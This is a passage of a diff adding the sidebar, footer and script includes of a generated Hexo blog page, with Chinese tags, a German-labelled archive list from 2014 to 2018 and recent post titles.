<a href="/tags/内存/" style="font-size: 10px;">内存</a> <a href="/tags/吉他谱/" style="font-size: 12.86px;">吉他谱</a> <a href="/tags/生活/" style="font-size: 17.14px;">生活</a> <a href="/tags/编译原理/" style="font-size: 11.43px;">编译原理</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">December 2014</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/01/12/es-update/">ElasticSearch大版本升级踩坑记</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/08/stackoverflow/">栈溢出学习入门总结</a>
+          </li>
+        
+          <li>
+            <a href="/2017/02/13/xss/">挖了一个xss小洞</a>
+          </li>
+        
+          <li>
+            <a href="/2017/02/05/python-mysql-zh/">python 读取 mysql 中文乱码</a>
+          </li>
+        
+          <li>
+            <a href="/2017/01/23/bingo/">Bingo</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 youfu<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
